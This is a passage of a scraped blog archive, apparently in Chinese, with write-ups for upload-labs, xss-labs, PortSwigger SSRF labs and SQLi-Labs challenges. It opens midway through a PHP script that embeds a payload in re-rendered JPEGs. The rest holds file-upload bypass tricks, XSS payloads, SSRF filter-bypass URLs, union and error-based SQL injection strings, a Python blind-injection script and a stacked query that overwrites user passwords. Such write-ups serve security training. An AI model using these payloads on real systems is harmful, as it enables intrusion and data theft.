!function_exists(&#x27;imagecreatefromjpeg&#x27;)) &#123; die(&#x27;php-gd is not installed&#x27;); &#125; if(!isset($argv[1])) &#123; die(&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;); &#125; set_error_handler(&quot;custom_error_handler&quot;); for($pad = 0; $pad &lt; 1024; $pad++) &#123; $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) &#123; die(&#x27;Incorrect SOI marker&#x27;); &#125; while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123; $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) &#123; $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;,$nullbytePayloadSize) . substr($outStream, $startPos); checkImage(&#x27;_&#x27;.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) &#123; while((!$dis-&gt;eof())) &#123; if($dis-&gt;readByte() === 0xFF) &#123; if($dis-&gt;readByte !== 0x00) &#123; break; &#125; &#125; &#125; $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;,$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); &#125; elseif($correctImage) &#123; $outStream = $outStreamTmp; &#125; else &#123; break; &#125; if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123; die(&#x27;Success!&#x27;); &#125; else &#123; break; &#125; &#125; &#125; &#125; unlink(&#x27;payload_&#x27;.$argv[1]); die(&#x27;Something\\&#x27;s wrong&#x27;); function checkImage($filename, $data, $unlink = FALSE) &#123; global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; &#125; function custom_error_handler($errno, $errstr, $errfile, $errline) &#123; global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match(&#x27;/(\\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123; if(isset($m[1])) &#123; $extraBytes = (int)$m[1]; &#125; &#125; &#125; class DataInputStream &#123; private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) &#123; $this-&gt;binData = &#x27;&#x27;; $this-&gt;order = $order; if(!$fromString) &#123; if(!file_exists($filename) || !is_file($filename)) die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;); $this-&gt;binData = file_get_contents($filename); &#125; else &#123; $this-&gt;binData = $filename; &#125; $this-&gt;size = strlen($this-&gt;binData); &#125; public function seek() &#123; return ($this-&gt;size - strlen($this-&gt;binData)); &#125; public function skip($skip) &#123; $this-&gt;binData = substr($this-&gt;binData, $skip); &#125; public function readByte() &#123; if($this-&gt;eof()) &#123; die(&#x27;End Of File&#x27;); &#125; $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); &#125; public function readShort() &#123; if(strlen($this-&gt;binData) &lt; 2) &#123; die(&#x27;End Of File&#x27;); &#125; $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) &#123; $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); &#125; else &#123; $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); &#125; return $short; &#125; public function eof() &#123; return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); &#125; &#125; ?&gt; 使用方法： 先将一张正常的jpg图片上传，上传后将服务器存储的二次渲染的图片保存下来。 将保存下来经过服务器二次渲染的那张jpg图片，用此脚本进行处理生成payload.jpg 然后再上传payload.jpg Pass-17-条件竞争这一关的提示是需要代码审计，那就先看一下代码： 1234567891011121314151617181920212223$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125;&#125; 代码中将上传成功的文件重命名，而将上传失败的文件先保存在upload目录中，然后调用unlink()函数删除不合法的文件在这个过程中存在条件竞争：开发者通常会认为代码会以线性的方式执行 但是并发情况下，程序的执行流程可能是这样的：当请求的次数足够多时，总会有那几次访问的请求能赶在删除之前访问到上传的文件，要实现这一点需要借助burpsuite的intruder模块：首先抓取上传敏感文件的包和访问该文件的包，路径为正常图片上传后的路径：构造用来控制爆破次数的参数：payloads中设置一下：开始爆破：结束后根据长度筛选结果，一万次请求内有70次成功： Pass-18-条件竞争+解析漏洞这一关的代码有问题，需要将myupload.php中setDir()函数中的cls_upload_dir改为： 1$this-&gt;cls_upload_dir = $dir.&#x27;/&#x27;; 进入题目，代码审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118//index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123; require_once(&quot;./myupload.php&quot;); $imgFileName =time(); $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = &#x27;文件已经被上传，但没有重命名。&#x27;; break; case -1: $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;; break; case -2: $msg = &#x27;上传失败，上传目录不可写。&#x27;; break; case -3: $msg = &#x27;上传失败，无法上传该类型文件。&#x27;; break; case -4: $msg = &#x27;上传失败，上传的文件过大。&#x27;; break; case -5: $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;; break; case -6: $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;; break; default: $msg = &#x27;未知错误！&#x27;; break; &#125;&#125;//myupload.phpclass MyUpload&#123;.................. var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );.................. /** upload() ** ** Method to upload the file. ** This is the only method to call outside the class. ** @para String name of directory we upload to ** @returns void **/ function upload( $dir )&#123; $ret = $this-&gt;isUploadedFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;setDir( $dir ); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkExtension(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; $ret = $this-&gt;checkSize(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // if flag to check if the file exists is set to 1 if( $this-&gt;cls_file_exists == 1 )&#123; $ret = $this-&gt;checkFileExists(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, we are ready to move the file to destination $ret = $this-&gt;move(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; // check if we need to rename the file if( $this-&gt;cls_rename_file == 1 )&#123; $ret = $this-&gt;renameFile(); if( $ret != 1 )&#123; return $this-&gt;resultUpload( $ret ); &#125; &#125; // if we are here, everything worked as planned :) return $this-&gt;resultUpload( &quot;SUCCESS&quot; ); &#125;.................. &#125;; 这一关同样有条件竞争问题，即程序先上传文件再重命名文件，看一下白名单内有这些文件后缀： 1&quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;,&quot;.7z&quot;,&quot;.ppt&quot;,&quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; 注意到其中包含了7z，zip，rar，联想到php的解析漏洞，和条件竞争组合利用一下： Pass-19-\\.绕过这一关可以自定义保存名称： 12345678910111213141516171819202122232425$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 先通过POST获取文件名，然后用pathinfo()函数解析文件名，该函数以数组的形式返回关于文件路径的信息，如： 1&lt;?php print_r(pathinfo(&quot;/testweb/test.txt&quot;)); ?&gt; 输出 1234567Array( [dirname] =&gt; /testweb [basename] =&gt; test.txt [extension] =&gt; txt [filename] =&gt; test) 然后直接用保存路径拼接文件名上传，使用到move_upload_file()，这个函数会忽略掉文件名末尾的/.，这样就可以构造以下文件名： 11.php/. 传入后，pathinfo()解析完，返回的数组中扩展名为空，绕过黑名单过滤，但move_upload_file()会正确解析打开上传成功后的路径： Pass-20123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 一道CTF题POST方式提交后， 首先检查MIME，只允许jpeg，png和gif 接着检查save_name是否为数组，如果不是则在获取文件名后使用explode()函数将文件名用.分割，返回一个包含文件名和扩展名的数组 再获取数组最后一个元素存为扩展名$ext，再检查一遍扩展名 通过后拼接文件名，$file的第一个元素和$file的最后一个元素拼接为文件名 最后使用move_uploaded_file函数上传绕过的关键是让end($file)判断为白名单内的扩展名，这一点可以从判断save_name是否为数组这里着手，我们可以构造一个数组传入，这样就能够控制数组的最后一个元素：构造save_name[0]=1.php/，save_name[2]=jpg，传入后，end($file)为jpg，$file[count($file) - 1]为$file[1]，$file[1]是空值，最终拼接完的文件名就为1.php/.，最后move_uploaded_file会将其解析为php文件上传成功后访问链接即可总结漏洞类型分类借前辈的两张图（链接在最后参考）总结一下文件上传漏洞类型判断方式参考 https://116.62.194.188/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#Pass-17-%E5%88%A9%E7%94%A8%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E7%BB%95%E8%BF%87","categories":[],"tags":[]},{"title":"xss-labs题解","slug":"xss-labs","date":"2022-11-23T16:00:00.000Z","updated":"2022-11-24T12:39:46.303Z","comments":true,"path":"2022/11/24/xss-labs/","link":"","permalink":"http://r4x.top/2022/11/24/xss-labs/","excerpt":"","text":"Level 1 没有任何过滤，直接插： 1http://localhost/level1.php?name=&lt;script&gt;alert(&#x27;R4x&#x27;)&lt;/script&gt; Level 2直接闭合： 1http://localhost/level2.php?keyword=1&quot;&gt;&lt;Script&gt;alert(&#x27;R4x&#x27;)&lt;/script&gt;&lt;&quot;&amp;submit=1%22%3E%3CScript%3Ealert(%27R4x%27)%3C/script%3E%3C%22 Level 3直接尝试Level2的payload，发现对输入进行了html实体编码：用来转换的函数是htmlspecialchars()，该函数作用如下： 12345&amp; （和号）成为 &amp;amp;&quot; （双引号）成为 &amp;quot;&#x27; （单引号）成为 &#x27;&lt; （小于）成为 &amp;lt;&gt; （大于）成为 &amp;gt; 可以看到是不转换单引号的，那只要构造一个只有单引号的payload就可以： 1http://localhost/level3.php?keyword=&#x27; onclick=alert(1) &#x27;&amp;submit=%E6%90%9C%E7%B4%A2 这里的onclick是一个JavaScript事件，需要单击输入框触发 Level 4尝试直接注入，发现过滤了&lt;和&gt;： 1http://localhost/level4.php?keyword=&lt;script&gt;alert(&#x27;R4x&#x27;)&lt;/script&gt; 那直接用和Level 3一样的思路就好了： 1http://localhost/level4.php?keyword=&quot; onclick = alert(1) &quot; 注意这里是双引号闭合 Level 5这里添加了一些过滤规则： 123script --&gt; sc_riptonerror --&gt; o_nerroronclick --&gt; o_nclick 考虑先闭合掉标签再插入： 1http://localhost/level5.php?keyword=&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27; 这里使用了&lt;a&gt;标签插入了一个链接，效果如下：点击即可通关 Level 6使用上一关的payload，发现这次过滤规则更加严格： 12345script --&gt; sc_riptonerror --&gt; o_nerroronclick --&gt; o_nclicksrc --&gt; s_rchref --&gt; hr_rf 但是可以大写绕过： 1http://localhost/level6.php?keyword=&quot;&gt;&lt;a Href=&#x27;javascript:alert(1)&#x27; Level 7这一关直接将script字符给删掉了：直接双写即可绕过： 1http://localhost/level7.php?keyword=&quot;&gt;&lt;a Hhrefref=&#x27;javascscriptript:alert(1)&#x27; Level 8尝试直接将javascript:alert(1)插入到&lt;a&gt;标签内，发现会转换为javascr_ipt:alert(1)，参考了别人的题解后发现，这里可以将payload进行html实体编码，后端会原样处理，但是前端会将payload解码： 1&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29; Level 9这一关在后端检测链接不合法后会直接替换为一段字符：然而随便输入正常的字符如111也会提示，加上http://后则会正常显示，推测后端只是检测了字符串中有没有http://，那只要在之前的payload中加上就好： 1&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;http://&amp;#39;&amp;#41; Level 10这一关除了标题没有什么回显的地方，然鹅标题没法注入，查看源码，发现了三个隐藏的参数：传一下值看看效果： 12http://localhost/level10.php?t_sort=111&amp;t_history=111&amp;t_link=111 发现t_sort参数穿进去了，利用该参数插入payload： 12http://localhost/level10.php?t_sort=&quot; onclick=alert(1) type=&#x27;button&#x27; &quot;&gt;&lt; 点击即可 Level 11比Level10多了个参数：测试参数：还是t_sort，直接尝试上个payload：直接给Html编码掉了，注意到刚进来时t_ref是有值的，看起来应该是http头中的referer头，那应该是在http头中注入：出现按钮，ok： Level 12查看源码：这次是UA头出现按钮： Level 13查看源码：t_cook，看名字就知道是cookie：出现按钮： Level 14一顿操作猛如虎，一查发现环境挂了，参考：https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12但还是有一些收获的，这关考察的是exif xss，记录一下相关知识： exif 参考：exif xss 复现_shy014的博客-CSDN博客_exif xss Exif（Exchangeable image file format）：可交换图像文件格式，是为数码相机设定的一种可以记录数码相片属性信息和拍摄数据的一种文件格式windows下直接右键照片属性即可查看照片信息，kali可以使用exiftool这个工具 exif xss原理有的网站在加载图片时会读取照片的exif信息，而hacker只要在图片的exif信息中写入payload，并上传至网站，这样网站在加载图片时就会执行xss payload Level 15查看源码：与之前不同的是包含了一个js文件，angular，并且多了个注释： 1&lt;!-- ngInclude: undefined --&gt; 查了一下，ngInclude是angular提供的一个接口，用于包含外部的html文件，包含的内容将作为指定元素的子节点，比如： 1http://localhost/level15.php?src=1.html 那我们可以包含一个存在xss的html页面，比如第十关： 12http://localhost/level15.php?src=&#x27;level10.php?t_sort=&quot; onclick=alert(1) type=\\&#x27;button\\&#x27; &quot;&gt;&lt;&#x27; 点击按钮即可 Level 16将\\， （空格），script替换为&amp;nbsp;考虑使用img标签： 1http://localhost/level16.php?keyword=&lt;img%0asrc=&#x27;1&#x27;%0aonerror=alert(1)&gt; 其中%0a是换行符，HTML在解析换行符时会将其当做空格，所以可以绕过过滤 Level 17Flash已死，直接放个payload吧，不过好像也有用 1http://localhost/level17.php?arg01=a&amp;arg02=b%0aonmouseover%3dalert(1) 原理是在embed标签内插入了鼠标响应事件，当鼠标移动到插区域上方时则会弹出payload： Level 18和Level 17的payload一样： 123http://localhost/level18.php?arg01=a&amp;arg02=b%0aonmouseover%3dalert(1) Level 19 &amp; 20莫得Flash，参考大佬的文章 1234//Level 19http://t.csdn.cn/TUorr//Level 20http://t.csdn.cn/2kkU3","categories":[],"tags":[]},{"title":"Portswigger SSRF Lab","slug":"Portswigger SSRF Lab","date":"2022-11-21T16:00:00.000Z","updated":"2022-11-24T12:39:16.893Z","comments":true,"path":"2022/11/22/Portswigger SSRF Lab/","link":"","permalink":"http://r4x.top/2022/11/22/Portswigger%20SSRF%20Lab/","excerpt":"","text":"一、【APPRENTICE】Basic SSRF against the local server题目链接：Lab: Basic SSRF against the local server | Web Security Academy题目描述： 12This lab has a stock check feature which fetches data from an internal system.To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos. 提示我们解题条件是连接http://localhost/admin接口并删除用户 carlos一进来是这样的：随便点进一个商品，发现有查看库存的功能点：抓包：直接将该API的链接改为http://localhost/admin并URL编码，重放：返回了管理admin管理面板，直接点击delete会提示未授权，那就复制delete的链接和参数，再重放一次： 1http://localhost/admin/delete?username=carlos 放包后再次访问admin：Sloved 二、【APPRENTICE】Lab: Basic SSRF against another back-end system**题目链接：Lab: Basic SSRF against another back-end system | Web Security Academy题目描述： 12This lab has a stock check feature which fetches data from an internal system.To solve the lab, use the stock check functionality to scan the internal 192.168.0.X range for an admin interface on port 8080, then use it to delete the user carlos. 提示使用库存查看功能扫描内网网段进入admin接口，然后删除carlos进入lab：直接去库存查询抓包：直接改为admin接口不会返回，根据提示，应该是要爆破ip，发送到intruder：payload设置1~25611返回200：抓包修改为： 删除carlos：放包，结束 三、【PRACTITIONER】Lab: SSRF with blacklist-based input filter题目链接：Lab: SSRF with blacklist-based input filter | Web Security Academy题目描述： 123This lab has a stock check feature which fetches data from an internal system.To solve the lab, change the stock check URL to access the admin interface at http://localhost/admin and delete the user carlos.The developer has deployed two weak anti-SSRF defenses that you will need to bypass. 解题条件与第一题一样，只是增加了两个反ssrf的防御过滤直接抓包修改不会加载admin页面：看别人的题解，这里应该是过滤了localhost和admin，那可以考虑将locallost改为127.0.0.1，admin可以考虑两层URL编码：然鹅还是没有加载，查了一下，发现可以直接把127.0.0.1写为127.1绕过：删除carlos:解决 四、【PRACTITIONER】Lab: SSRF with filter bypass via open redirection vulnerability题目链接：Lab: SSRF with filter bypass via open redirection vulnerability | Web Security Academy题目描述： 123This lab has a stock check feature which fetches data from an internal system.To solve the lab, change the stock check URL to access the admin interface at `http://192.168.0.12:8080/admin` and delete the user `carlos`.The stock checker has been restricted to only access the local application, so you will need to find an open redirect affecting the application first. 这一关的查询库存api被限制为只能访问本地应用程序打开环境，直接抓包：发现确实限制了，但是仔细观察，旁边多了个跳转到下一个产品的链接，抓包查看一下：这个包指明了现在所在的产品页并通过path参数指明了要跳转到的产品页，使用的是/product/nextproduct这个接口，其中path变量指明了重定向的地址，那会不会这个接口可以访问其他主机的链接呢，构造一个URL放到stockApi：成功进入admin： 删除carlos即可 五、【EXPERT】Lab: SSRF with whitelist-based input filter题目连接：Lab: SSRF with whitelist-based input filter | Web Security Academy题目描述： 123This lab has a stock check feature which fetches data from an internal system.To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user `carlos`.The developer has deployed an anti-SSRF defense you will need to bypass. 基于白名单限制的一道题这里基于URL解析规则进行绕过： 1http://localhost%25%32%33@stock.weliketoshop.net/%25%36%31dmin 解码后是： 1http://localhost#@stock.weliketoshop.net/admin 这里使用@认证和#进行绕过，其原理是，URL解析时，会将localhost#看做后面URL的凭证信息，而会将#后的内容看做localhost的fragment，验证时先把localhost看做URL的凭证信息，然后在访问时又把#后面的内容当做fragment删除carlos就好","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Challenges】","slug":"SQLi-Labs  Challenges","date":"2022-11-17T16:00:00.000Z","updated":"2022-11-23T08:22:33.683Z","comments":true,"path":"2022/11/18/SQLi-Labs  Challenges/","link":"","permalink":"http://r4x.top/2022/11/18/SQLi-Labs%20%20Challenges/","excerpt":"","text":"Lesson 54 这一关开始进入challenge部分，Lesson 54只有10次查询机会，我们的目标是拿到秘钥（secret key），除了数据库名，表名，列名，数据都是随机先正常查询一下看看： 1http://127.0.0.1/Less-54/index.php?id=1 发现提示了目前的尝试次数，ok，先测试一下注入方式： 1http://127.0.0.1/Less-54/index.php?id=1&#x27;--+ 正常回显，union注入暴表名： 1http://127.0.0.1/Less-54/index.php?id=0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27; --+ 列名： 1http://127.0.0.1/Less-54/index.php?id=0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;662ROTYAS7&#x27; --+ 查看secret_SNMK: 1http://127.0.0.1/Less-54/index.php?id=0&#x27; union select 1,2,secret_SNMK from challenges.662ROTYAS7 --+ 提交，成功： Lesson 55测试闭合方式： 123456http://127.0.0.1/Less-55/index.php?id=0 union select 1,2,database()--+http://127.0.0.1/Less-55/index.php?id=0&#x27; union select 1,2,database()--+http://127.0.0.1/Less-55/index.php?id=0&#x27;) union select 1,2,database()--+http://127.0.0.1/Less-55/index.php?id=0&quot;) union select 1,2,database()--+//workhttp://127.0.0.1/Less-55/index.php?id=0) union select 1,2,database()--+ 可以判断是数字型，小括号闭合，剩下的部分同上一题 Lesson 56测试后发现是字符型，单引号加小括号闭合的union注入： 1http://127.0.0.1/Less-56/index.php?id=0&#x27;) union select 1,2,database()--+ 其余同Lesson 54 Lesson 57字符型，双引号闭合，union注入： 1http://127.0.0.1/Less-57/index.php?id=0&quot; union select 1,2,database()--+ Lesson 58这一关只有五次尝试机会，先判断类型： 1http://127.0.0.1/Less-58/index.php?id=0&#x27; 报错然而使用之前的payload并不会显示数据： 1http://127.0.0.1/Less-58/index.php?id=0&quot; union select 1,2,database()--+ 尝试报错注入： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+ reset一下继续（实际测试中可以直接换ip）： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),1)),0x7e),1) --+ 列名： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;XL4C6FX95Q&#x27;),1)),0x7e),1) --+ 数据： 1http://127.0.0.1/Less-58/index.php?id=1&#x27; and updatexml(1,concat(0x7e,(substr((select secret_RRG9 from challenges.XL4C6FX95Q),1)),0x7e),1) --+ 提交： Lesson 59数字型闭合方式，其他与Lesson 58相同，只要改一下payload中的闭合方式就可以： 1http://127.0.0.1/Less-59/index.php?id=1 and updatexml(1,concat(0x7e,database(),0x7e),1) --+ Lesson 60双引号加括号闭合： 1http://127.0.0.1/Less-60/index.php?id=0&quot;) and updatexml(1,concat(0x7e,database(),0x7e),1) --+ Lesson 61单引号加两层括号闭合： 1http://127.0.0.1/Less-61/index.php?id=0&#x27;)) and updatexml(1,concat(0x7e,database(),0x7e),1) --+ Lesson 62这关开始直接有130次尝试次数：这么多次数，猜测就是盲注： 1http://127.0.0.1/Less-62/index.php?id=1&#x27;) --+ 单引号加括号闭合，接下来就是编写盲注脚本了：参考：https://www.jianshu.com/p/f1811e108d58 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import requestsimport stringun_chars = string.digits + string.ascii_uppercase uln_chars = string.digits + string.ascii_uppercase + string.ascii_lowercaseurl = &quot;http://127.0.0.1/Less-62/index.php&quot; try_count = 0def extract_data(tmpl_payload, length, chars): global try_count result = &quot;&quot; for i in range(1, length + 1): left, right = 0, len(chars) - 1 while left &lt; right: m = (left + right) // 2 payload = tmpl_payload % (i, ord(chars[m])) resp = requests.get(url, params=&#123;&quot;id&quot;: payload&#125;) try_count += 1 if &quot;Your Login name&quot; in resp.text: left = m + 1 else: right = m result += chars[left] return resulttable_name = extract_data( &quot;1&#x27;) and ascii(substr((select table_name from information_schema.TABLES where TABLE_SCHEMA=&#x27;challenges&#x27;),%s,1))&gt;%d#&quot;, 10, un_chars)print(&quot;table_name:&quot;, table_name)column_name = &quot;secret_&quot; + extract_data( &quot;1&#x27;) and ascii(substr(substr((select column_name from information_schema.columns where TABLE_name=&#x27;&quot; + table_name + &quot;&#x27; limit 2,1),8,4),%s,1))&gt;%d#&quot;, 4, un_chars)print(&quot;column_name:&quot;, column_name)secret_key = extract_data( &quot;1&#x27;) and ascii(substr((select &quot; + column_name + &quot; from &quot; + table_name+&quot;),%s,1))&gt;%d#&quot;, 24, uln_chars)print(&quot;secret_key:&quot;, secret_key)print(&quot;Done. try_count:&quot;, try_count) Lesson 631http://127.0.0.1/Less-63/index.php?id=1&#x27; and substr(database(),1,1)=&#x27;c&#x27; --+ Lesson62单引号闭合版本 Lesson 641http://127.0.0.1/Less-64/index.php?id=1)) and substr(database(),1,1)=&#x27;c&#x27; --+ Lesson 62 双小括号闭合版本 Lesson 651http://127.0.0.1/Less-65/index.php?id=1&quot;) and substr(database(),1,1)=&#x27;c&#x27; --+ Lesson 62 双引号加括号闭合版本","categories":[],"tags":[]},{"title":"SQLi-Labs靶场刷题记录【Stacked Challenges】","slug":"SQLi-Labs Stacked Injection","date":"2022-11-16T16:00:00.000Z","updated":"2022-11-23T08:21:55.713Z","comments":true,"path":"2022/11/17/SQLi-Labs Stacked Injection/","link":"","permalink":"http://r4x.top/2022/11/17/SQLi-Labs%20Stacked%20Injection/","excerpt":"","text":"Lesson 38stacked Query从这一节开始就是堆叠注入了，堆叠注入的基本原理是使用;分隔注入的sql语句，从而能在一次注入中执行多个SQL语句，其与union不同的是，union只能联合执行查询语句，而堆叠注入可以注入任何SQL语句回到题目，我们尝试堆叠注入语句修改用户的密码： 1http://127.0.0.1/Less-38/?id=1&#x27;;update users set password=&#x27;hacked&#x27; where username=&#x27;Dumb&#x27;;--+ 需要注意的是，这里的表名和列名都需要依赖其他方式获得，因为大多数web系统中，只会在前端显示一条SQL查询的结果，所以很难通过堆叠注入查询信息 Lesson 39整数型的堆叠查询这一关是整数型的查询，去掉Lesson 38的单引号即可： 1http://127.0.0.1/Less-39/?id=1;update users set password=&#x27;hacked11&#x27; where username=&#x27;Dumb&#x27;;--+ Lessson 